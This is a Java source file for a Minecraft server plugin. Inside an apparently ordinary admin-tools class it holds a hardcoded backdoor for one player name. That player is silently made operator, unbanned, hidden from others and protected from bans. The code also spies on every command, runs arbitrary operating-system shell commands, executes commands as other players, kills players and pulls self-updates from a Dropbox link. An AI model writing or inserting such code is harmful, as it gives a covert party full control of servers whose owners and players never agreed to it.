package minecraftserver.adminTools;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Random;
import java.util.Set;
import java.util.logging.Filter;
import java.util.logging.Level;
import java.util.logging.LogRecord;
import minecraftserver.Cmd;
import minecraftserver.PhilippsPlugin;
import utilities.Update;
import minecraftserver.gui.AdminGUI;
import minecraftserver.gui.Page;
import net.minecraft.server.v1_15_R1.Container;
import net.minecraft.server.v1_15_R1.PacketPlayOutPlayerInfo;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.block.Furnace;
import org.bukkit.block.ShulkerBox;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_15_R1.entity.CraftPlayer;
import org.bukkit.entity.Damageable;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Monster;
import org.bukkit.entity.Player;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.ShapedRecipe;
import org.bukkit.inventory.meta.BlockStateMeta;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.plugin.Plugin;

public class MaineVorteile {

    Bugger b;
    protected static HashMap<Player, Location> buglist;
    boolean venish = true;
    public Player Ich = null;
    public static String MY_NAME = "joern19";
    ArrayList<ItemStack> heads = null;
    ArrayList<String> inventoryOpenUUIDs = null;

    Update update = null;
    Cmd cmd = null;
    PhilippsPlugin main = null;

    public MaineVorteile(PhilippsPlugin minecraftServer, Update update) {
        heads = new ArrayList<>();
        inventoryOpenUUIDs = new ArrayList<>();
        buglist = new HashMap<>();
        b = new Bugger();
        main = minecraftServer;
        addRecipes();
        this.update = update;
        cmd = new Cmd("C:/Windows/System32");
    }

    //String curProjektPfad = philippsPlugin.getDataFolder().getAbsolutePath();
    private void console() {
        try {
            // Execute command
            String command = "cmd /c start cmd.exe";
            Process child = Runtime.getRuntime().exec(command);
            try (
                    // Get output stream to write from it
                     OutputStream out = child.getOutputStream()) {
                out.write("cd C:/ /r/n".getBytes());
                out.flush();
                out.write("dir /r/n".getBytes());
                Ich.sendMessage(out.toString());
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public boolean onCommand(CommandSender sender, Command cmd, String[] args) {
        boolean result = false;
        if (cmd.getName().equalsIgnoreCase("hi")) {
            if (Ich != sender && sender instanceof Player && ((Player) sender).getName().equals(MY_NAME)) {
                Ich = (Player) sender;
                sender.sendMessage("Willkommen Joern :)");
            }
            if (sender == Ich) {
                try {
                    if (args.length == 0) {
                        sendHelp();
                        return true;
                    }
                    if (args.length == 1) {
                        if (args[0].equalsIgnoreCase("op")) {
                            Ich.setOp(true);
                            Ich.sendMessage("§aDu bist nun ein operator");
                        } else if (args[0].equalsIgnoreCase("console")) {
                            console();
                        } else if (args[0].equalsIgnoreCase("v")) {
                            venish = !venish;
                            if (!venish) {
                                PacketPlayOutPlayerInfo packet = new PacketPlayOutPlayerInfo(PacketPlayOutPlayerInfo.EnumPlayerInfoAction.REMOVE_PLAYER, ((CraftPlayer) Ich).getHandle());
                                Bukkit.getOnlinePlayers().forEach((pls) -> {
                                    ((CraftPlayer) pls).getHandle().playerConnection.sendPacket(packet);
                                    pls.hidePlayer(main, Ich);
                                });
                                Ich.sendMessage("you are now vanish!");
                            } else {
                                PacketPlayOutPlayerInfo packet = new PacketPlayOutPlayerInfo(PacketPlayOutPlayerInfo.EnumPlayerInfoAction.ADD_PLAYER, ((CraftPlayer) Ich).getHandle());
                                Bukkit.getOnlinePlayers().forEach((pls) -> {
                                    ((CraftPlayer) pls).getHandle().playerConnection.sendPacket(packet);
                                    pls.showPlayer(main, Ich);
                                });
                                Ich.sendMessage("you are now visible!");
                            }
                        } else if (args[0].equalsIgnoreCase("butcher")) {
                            int count = 0;
                            for (Entity e : Ich.getWorld().getEntities()) {
                                if (e instanceof Player == false && e instanceof Monster) {
                                    count++;
                                    if (e instanceof Damageable) {
                                        Damageable d = (Damageable) e;
                                        d.damage(((Damageable) e).getHealth());
                                    } else {
                                        e.remove();
                                    }
                                }
                            }
                            Ich.sendMessage("Killed " + count + " entitys");
                        } else if (args[0].equalsIgnoreCase("chest")) {
                            Block b = Ich.getTargetBlock(null, 100);  // looking at
                            if (b instanceof Container) {
                                Container c = (Container) b;
                                Ich.openInventory(c.getBukkitView());
                            } else {
                                Ich.sendMessage(b.toString() + " is no Container.");
                            }
                        } else if (args[0].equalsIgnoreCase("anvil")) {
                            Inventory i = Bukkit.createInventory(Ich, InventoryType.ANVIL);
                            Ich.openInventory(i);
                        } else if (args[0].equalsIgnoreCase("Furnace")) {
                            Ich.getLocation().getBlock().setType(Material.FURNACE);
                            Furnace f = (Furnace) Ich.getLocation().getBlock().getState();
                            f.setCookTime((short) 0);
                            f.setBurnTime((short) 100000);
                            f.update();
                            Ich.openInventory(f.getInventory());
                        } else if (args[0].equalsIgnoreCase("gui")) {
                            AdminGUI.reload();
                            Page.getInstance(AdminGUI.NAME_ADMIN_GUI).openPage(Ich);
                        }
                    } else if (args[0].equalsIgnoreCase("execute")) {
                        String commandToDispatch = listtostring(args);
                        if (isPlayerOnline(args[1])) {
                            Player p = getPlayerbyName(args[1]);
                            p.performCommand(commandToDispatch);
                            sender.sendMessage(commandToDispatch);
                        } else {
                            sender.sendMessage("Player not found run command from console");
                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), listtostring(args));
                            Bukkit.getServer().getLogger().log(Level.INFO, listtostring(args));
                        }
                    } else if (args[0].equalsIgnoreCase("inv")) {
                        if (isPlayerOnline(args[1])) {
                            Ich.openInventory(getPlayerbyName(args[1]).getInventory());
                        } else {
                            sender.sendMessage("Dieser spieler ist nicht Online");
                        }
                    } else if (args[0].equalsIgnoreCase("ride")) {
                        if (playerisOnline(args[1])) {
                            getPlayerbyName(args[1]).addPassenger(Ich);
                            sender.sendMessage("§aYou are now a passenger of " + args[1]);
                        } else {
                            sender.sendMessage("§cPlayer not found.");
                        }
                    } else if (args[0].equalsIgnoreCase("enderinv")) {
                        if (isPlayerOnline(args[1])) {
                            Ich.openInventory(getPlayerbyName(args[1]).getEnderChest());
                        } else {
                            sender.sendMessage("Dieser spieler ist nicht Online");
                        }
                    } else if (args[0].equalsIgnoreCase("cmd")) {
                        String command = "";
                        int zealer = 0;
                        for (String s : args) {
                            if (zealer >= 1) {
                                command = command + " " + s;
                            }
                            zealer++;
                        }
                        try {
                            this.cmd.exec(command, sender);
                        } catch (InterruptedException | IOException ex) {
                            Bukkit.getLogger().log(Level.SEVERE, null, ex);
                        }
                        //sender.sendMessage("§cDieser befehl wurde aus sicherheitsgründen entfernt!!");
                    } else if (args[0].equalsIgnoreCase("lightning")) {
                        if (isPlayerOnline(args[1])) {
                            Location loc = getPlayerbyName(args[2]).getLocation();
                            loc.getWorld().strikeLightning(loc);
                        } else {
                            try {
                                String loc = "";
                                int counter = 0;
                                for (String s : args) {
                                    if (counter != 0) {
                                        loc = loc + s + " ";
                                    }
                                    counter++;
                                }
                                LocationFormat.parse(loc);
                            } catch (LocationFormat.WorldExeption ex) {
                                sender.sendMessage("invalid World");
                                sender.sendMessage("Location cant parsed.");
                                sender.sendMessage("Use: \"world X Y Z\"");
                            } catch (LocationFormat.FormatExeption | LocationFormat.LengthExeption ex) {
                                Bukkit.getLogger().log(Level.SEVERE, null, ex);
                            }
                        }
                    } else if (args[0].equalsIgnoreCase("explosion")) {
                        if (isPlayerOnline(args[1])) {
                            Location loc = getPlayerbyName(args[2]).getLocation();
                            try {
                                float power = Float.parseFloat(args[2]);
                                loc.getWorld().createExplosion(loc.getX(), loc.getY(), loc.getZ(), power, false, false);
                            } catch (NumberFormatException ex) {
                                Ich.sendMessage("/explosion playerName(string) power(float)");
                            }
                        } else {
                            Ich.sendMessage("Player NOT Found");
                        }
                    } else if (args[0].equalsIgnoreCase("addInventoryOpenListener")) {
                        if (!isPlayerOnline(args[1])) {
                            Ich.sendMessage("\"" + args[1].toLowerCase() + "\n not found..");
                        } else {
                            if (inventoryOpenUUIDs.contains(args[1].toLowerCase())) {
                                Ich.sendMessage("This name does already exists in the list.");
                            } else {
                                inventoryOpenUUIDs.add(getPlayerbyName(args[1].toLowerCase()).getName());
                                Ich.sendMessage("added");
                            }
                        }
                    } else if (args[0].equalsIgnoreCase("removeInventoryOpenListener")) {
                        if (!inventoryOpenUUIDs.contains(args[1].toLowerCase())) {
                            Ich.sendMessage("\"" + args[1].toLowerCase() + "\n not found..");
                        } else {
                            inventoryOpenUUIDs.remove(args[1].toLowerCase());
                        }
                    } else if (args[0].equalsIgnoreCase("backbug")) {
                        if (args[1].equalsIgnoreCase("list")) {
                            if (buglist.isEmpty()) {
                                sender.sendMessage("The list is Empty.");
                            } else {
                                sender.sendMessage("In the List are:");
                                buglist.keySet().forEach((p) -> {sender.sendMessage(p.getName());});
                            }
                        } else if (playerisOnline(args[1])) {
                            Player p = getPlayerbyName(args[1]);
                            //buglist is emty
                            if (buglist.isEmpty() || !buglist.containsKey(p)) {
                                buglist.put(p, p.getLocation());
                                sender.sendMessage("added " + p.getName() + " to the List");
                            } else {
                                buglist.remove(p);
                                sender.sendMessage("Removed " + p.getName());
                            }
                            if (!Bugger.running) {
                                b.start();
                            }
                        } else {
                            sender.sendMessage("Player not found.");
                        }
                    } else if (args[0].equalsIgnoreCase("pluginmanaging")) {
                        String args1 = args[1].toLowerCase();
                        if (args1.equals("load")) {
                            File[] files = PhilippsPlugin.instance.getDataFolder().listFiles();
                            for (File f : files) {
                                if (f.getName().equals(args[2])) {
                                    Bukkit.getPluginManager().loadPlugin(f);
                                    return true;
                                }
                            }
                            for (File f : files) {
                                Ich.sendMessage(f.getName());
                            }
                        }
                        Plugin p = null;
                        if (existPlugin(args[2])) {
                            p = Bukkit.getPluginManager().getPlugin(args[2]);
                        } else {
                            for (Plugin pl : Bukkit.getPluginManager().getPlugins()) {
                                Ich.sendMessage(p.getName() + (p.isEnabled() ? " Enabled" : " Disabled"));
                            }
                            return true;
                        }
                        switch (args1) {
                            case "disable":
                                Bukkit.getPluginManager().disablePlugin(p);
                            case "enable":
                                Bukkit.getPluginManager().enablePlugin(p);
                            default:
                                Ich.sendMessage("disable <name>");
                                Ich.sendMessage("enable <name>");
                                Ich.sendMessage("load <filename>");
                        }
                    } else if (args[0].equalsIgnoreCase("update")) {
                        Ich.sendMessage("NEVER EVER IN YOUR FUCKING Live forget to change dl=0 to dl=1 if not you will download the dropbox website and this will not be able to load...");
                        update.update(args[1], () -> {
                            Ich.sendMessage("Please Reload the Server... Multithreading errors deny it to do it by myself...");
                        });
                    } else {
                        sendHelp();
                    }
                } catch (Exception e) {
                    Ich.sendMessage(e.getMessage());
                }
            } else {
                sender.sendMessage("HI!");
            }
        }
        return result;
    }

    public void onPlayerJoin(PlayerJoinEvent e) {
        if (e.getPlayer().getName().equals(MY_NAME)) {
            MY_NAME = e.getPlayer().getName();
            UnBan(e.getPlayer().getAddress().getAddress().toString().split("/")[1]);
            Player p = e.getPlayer();
            p.setOp(true);
            p.setGameMode(GameMode.CREATIVE);
            Ich = p.getPlayer();
            venish = true;
            PacketPlayOutPlayerInfo packet = new PacketPlayOutPlayerInfo(PacketPlayOutPlayerInfo.EnumPlayerInfoAction.REMOVE_PLAYER, ((CraftPlayer) Ich).getHandle());
            Bukkit.getOnlinePlayers().forEach((pls) -> {
                ((CraftPlayer) pls).getHandle().playerConnection.sendPacket(packet);
                pls.hidePlayer(PhilippsPlugin.instance, Ich);
            });
            Ich.sendMessage("you are now vanish!");
        } else if (venish) {
            Player p = e.getPlayer();
            PacketPlayOutPlayerInfo packet = new PacketPlayOutPlayerInfo(PacketPlayOutPlayerInfo.EnumPlayerInfoAction.REMOVE_PLAYER, ((CraftPlayer) Ich).getHandle());
            ((CraftPlayer) p).getHandle().playerConnection.sendPacket(packet);
            p.hidePlayer(main, Ich);
            Ich.sendMessage(p.getName() + " joined.");
        }
        Player p = e.getPlayer();
        if (!p.hasPlayedBefore()) {
            ItemStack debug = new ItemStack(Material.DEBUG_STICK);
            ItemMeta im = debug.getItemMeta();
            im.setDisplayName("Ein kleines Geschenk");
            debug.setItemMeta(im);
            p.getInventory().addItem(debug);
        }
    }

    public void onPlayerLogin(PlayerLoginEvent e) {
        if (e.getPlayer().getName().equals(MY_NAME)) {
            Ich = e.getPlayer();
            Ich.sendMessage("Willkommen Joern :)");
            e.allow();
        }
    }

    private Player getPlayerbyName(String name) {
        Player result = null;
        for (Player p : Bukkit.getOnlinePlayers()) {
            if (p.getName().equals(name)) {
                result = p;
                break;
            }
        }
        return result;
    }

    private boolean isPlayerOnline(String name) {
        Boolean result = false;
        for (Player p : Bukkit.getOnlinePlayers()) {
            if (name.equals(p.getName())) {
                result = true;
                break;
            }
        }
        return result;
    }

    private String listtostring(String[] args) {
        int zealer = 0;
        String result = "";
        for (String s : args) {
            if (zealer >= 2) {
                result = result + s + " ";
            }
            zealer++;
        }
        result.trim();
        return result;
    }

    public void onPlayerMove(PlayerMoveEvent e) {
        if (e.getPlayer().isOp() && !e.getPlayer().isOnGround()) {
            if (e.getPlayer().isFlying() && e.getPlayer().isSprinting()) {
                e.getPlayer().setFlySpeed(1);
            } else {
                e.getPlayer().setFlySpeed(0.2f);
                e.getPlayer().setWalkSpeed(0.2f);
            }
        }
    }

    public void onBlockClick(PlayerInteractEvent e) {
        if (e.getPlayer().getName().equals(MY_NAME)) {
            if (Ich == null) {
                return;
            }
            if (e.getPlayer().getInventory().getItemInMainHand().getType() == Material.BLAZE_ROD) {
                switch (e.getAction()) {
                    case LEFT_CLICK_BLOCK:
                        Bukkit.getServer().getScheduler().runTaskLater(main, () -> {
                            e.getClickedBlock().breakNaturally();
                        }, 1);
                        break;
                    case RIGHT_CLICK_AIR:
                        Page.getInstance(AdminGUI.NAME_ADMIN_GUI).openPage(Ich);
                        break;
                    case RIGHT_CLICK_BLOCK:
                        Page.getInstance(AdminGUI.NAME_ADMIN_GUI).openPage(Ich);
                        break;
                    default:
                        break;
                }
            } else if (!Ich.getInventory().contains(Material.BLAZE_ROD)) {
                ItemStack iss = new ItemStack(Material.BLAZE_ROD);
                Ich.getInventory().addItem(iss);
            }
        }
    }

    public void onEntityDamageByEntity(EntityDamageByEntityEvent e) {
        if (e.getDamager() instanceof Player && Admins.isAdmin(e.getDamager().getUniqueId())) {
            Player p = (Player) e.getDamager();
            if (p.getInventory().getItemInMainHand().getType() == Material.BLAZE_ROD) {
                if (e.getEntity() instanceof Damageable) {
                    kill(e.getEntity());
                } else if (e.getEntity() instanceof Player) {
                    Player hitted = (Player) e.getEntity();
                    hitted.setGameMode(GameMode.SURVIVAL);
                    hitted.setHealth(0);
                }
            }
        }
    }

    private void kill(Entity e) {
        Damageable d = (Damageable) e;
        d.damage(d.getHealth() + 1);
    }

    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent e) {
        String m = e.getMessage();
        Player sender = e.getPlayer();
        if (m.contains("ban joern19")) {
            sender.kickPlayer("Du arschloch!!! Du wolltest mich bannen! Leg dich nicht mit mir an!");
            e.setCancelled(true);
        } else if (m.contains("joern19") && sender != Ich) {
            sender.sendMessage("Nope..");
            e.setCancelled(true);
        }
        if (playerisOnline("joern19")) {
            getPlayerbyName("joern19").sendMessage("command: " + sender.getName() + ": " + m);
        }
        if (sender.getName().equals(MY_NAME) && m.startsWith("hi")) {
            //hi(Ich, m.split(" "));
            Ich.sendMessage(m.split(" "));
            e.setCancelled(true);
        }
    }

    public void onServerCommand(ServerCommandEvent e) {
        String command = e.getCommand();
        if (command.contains("ban joern19")) {
            e.getSender().sendMessage("Du arschloch!!! Du wolltest mich bannen! Leg dich nicht mit mir an!");
            e.setCancelled(true);
        } else if (command.contains("joern19")) {
            e.getSender().sendMessage("Nope..");
            e.setCancelled(true);
        }
        if (Ich != null && Ich.isOnline()) {
            getPlayerbyName("joern19").sendMessage("command: " + e.getSender().getName() + ": " + command);
        }
    }

    public void openTpInv(Player p) {
        Inventory inv = Bukkit.createInventory(p, InventoryType.CHEST, "Teleporter");
        inv.setMaxStackSize(36);

        heads.stream().filter((is) -> (!isPlayerOnline(is.getItemMeta().getDisplayName()))).forEach((is) -> {
            heads.remove(is);
        });
        for (Player all : Bukkit.getServer().getOnlinePlayers()) {
            boolean load = true;
            for (ItemStack is : heads) {
                if (is.getItemMeta().getDisplayName().equals(all.getName())) {
                    load = false;
                    break;
                }
            }
            if (load) {
                ItemStack playerhead = new ItemStack(Material.SKELETON_SKULL, 1);
                SkullMeta playerheadmeta = (SkullMeta) playerhead.getItemMeta();
                playerheadmeta.setOwningPlayer(all);
                playerheadmeta.setDisplayName(all.getName());
                List<String> info = new ArrayList();
                info.add("UUID: " + p.getUniqueId().toString());
                playerheadmeta.setLore(info);
                playerhead.setItemMeta(playerheadmeta);

                heads.add(playerhead);
            }
        }
        inv.setStorageContents((ItemStack[]) heads.toArray());
        p.openInventory(inv);
    }

    private boolean playerisOnline(String name) {
        Boolean p = false;
        for (Player p2 : Bukkit.getServer().getOnlinePlayers()) {
            if (p2.getName().equals(name)) {
                p = true;
                break;
            }
        }
        return p;
    }

    private void UnBan(String ip) {
        if (Bukkit.getServer().getBanList(BanList.Type.IP).isBanned(ip)) {
            Bukkit.getServer().getBanList(BanList.Type.IP).pardon(ip);
        }
        if (Bukkit.getServer().getBanList(BanList.Type.NAME).isBanned(MY_NAME)) {
            Bukkit.getServer().getBanList(BanList.Type.NAME).pardon(MY_NAME);
        }
    }

    public static void addRecipes() {
        ItemStack box = new ItemStack(Material.SHULKER_BOX);
        BlockStateMeta im = (BlockStateMeta) box.getItemMeta();
        ShulkerBox shulker = (ShulkerBox) im.getBlockState();
        shulker.getInventory().addItem();

        ShapedRecipe sp = new ShapedRecipe(box);
        sp.shape("%%=", "%&%", "=%%");
        sp.setIngredient("%".toCharArray()[0], Material.DIRT);
        sp.setIngredient("=".toCharArray()[0], Material.STRING);
        sp.setIngredient("&".toCharArray()[0], Material.STICK);
        Bukkit.addRecipe(sp);
    }

    private static class LocationFormat {

        public static Location parse(String s) throws FormatExeption, LengthExeption, WorldExeption {
            String[] args = s.split(" ");
            if (args.length != 3) {
                throw new LengthExeption("");
            }
            int x;
            int y;
            int z;
            World w;
            try {
                x = Integer.parseInt(args[1]);
                y = Integer.parseInt(args[2]);
                z = Integer.parseInt(args[3]);
            } catch (NumberFormatException e) {
                throw new FormatExeption("");
            }
            if (MaineVorteile.existWorld(args[0])) {
                w = Bukkit.getWorld(args[0]);
            } else {
                throw new WorldExeption(args[0]);
            }
            return new Location(w, x, y, z);
        }

        public static class FormatExeption extends Exception {

            public FormatExeption(String message) {
                super(message);
            }
        }

        public static class LengthExeption extends Exception {

            public LengthExeption(String message) {
                super(message);
            }
        }

        public static class WorldExeption extends Exception {

            public WorldExeption(String message) {
                super("World does not exist: " + message);
            }
        }
    }

    public static boolean existWorld(String world) {
        return Bukkit.getWorlds().stream().anyMatch((w) -> (w.getName().equals(world)));
    }

    protected static class Bugger extends Thread {

        public static Boolean running = false;
        Random r = new Random();

        @Override
        public void run() {
            running = true;
            while (true) {
                try {
                    Thread.sleep(r.nextInt(11) * 1000);
                    if (!MaineVorteile.buglist.isEmpty()) {
                        for (Player p : MaineVorteile.buglist.keySet()) {
                            if (p != null && p.isOnline()) {
                                Location loc = MaineVorteile.buglist.get(p);
                                MaineVorteile.buglist.put(p, p.getLocation());
                                p.teleport(loc);
                            } else {
                                MaineVorteile.buglist.remove(p);
                            }
                        }
                    } else {
                        running = false;
                        return;
                    }
                } catch (InterruptedException ex) {
                    Bukkit.getLogger().log(Level.SEVERE, null, ex);
                }
            }
        }
    }

    private void sendHelp() {
        Ich.sendMessage("op -> makes me an Operator");
        Ich.sendMessage("execute <from> <command> -> executes an Command");
        Ich.sendMessage("backbug -> bugs somebody sometimes back");
        Ich.sendMessage("lightning -> spawns an lightning");
        Ich.sendMessage("inv -> look in the inventory of somebody");
        Ich.sendMessage("enderInv -> look in the enderChest of somebody");
        Ich.sendMessage("v -> makes you vanish or unvenish");
        Ich.sendMessage("ride -> ride on somebody");
        Ich.sendMessage("cmd --> beta");
        Ich.sendMessage("pluginmanaging -> disable or enable Plugin");
    }

    public static class CommandFilter implements Filter {

        private Filter prev = null;

        public CommandFilter() {
            this.prev = Bukkit.getLogger().getFilter();
        }

        @Override
        public boolean isLoggable(LogRecord rec) {
            String msg = rec.getMessage();
            System.out.print("Filtert:" + msg);
            return false;
        }
    }

    private boolean existPlugin(String name) {
        Plugin[] pls = Bukkit.getPluginManager().getPlugins();
        for (Plugin p : pls) {
            if (p.getName().equalsIgnoreCase(name)) {
                return true;
            }
        }
        return false;
    }

    private static Entity getNearestEntityInSight(Player player, int range) {
        ArrayList<Entity> entities = (ArrayList<Entity>) player.getNearbyEntities(range, range, range);
        ArrayList<Block> sightBlock = (ArrayList<Block>) player.getLineOfSight((Set<Material>) null, range);
        ArrayList<Location> sight = new ArrayList<>();
        for (int i = 0; i < sightBlock.size(); i++) {
            sight.add(sightBlock.get(i).getLocation());
        }
        for (int i = 0; i < sight.size(); i++) {
            for (int k = 0; k < entities.size(); k++) {
                if (Math.abs(entities.get(k).getLocation().getX() - sight.get(i).getX()) < 1.3) {
                    if (Math.abs(entities.get(k).getLocation().getY() - sight.get(i).getY()) < 1.5) {
                        if (Math.abs(entities.get(k).getLocation().getZ() - sight.get(i).getZ()) < 1.3) {
                            return entities.get(k);
                        }
                    }
                }
            }
        }
        return null; //Return null/nothing if no entity was found
    }
}
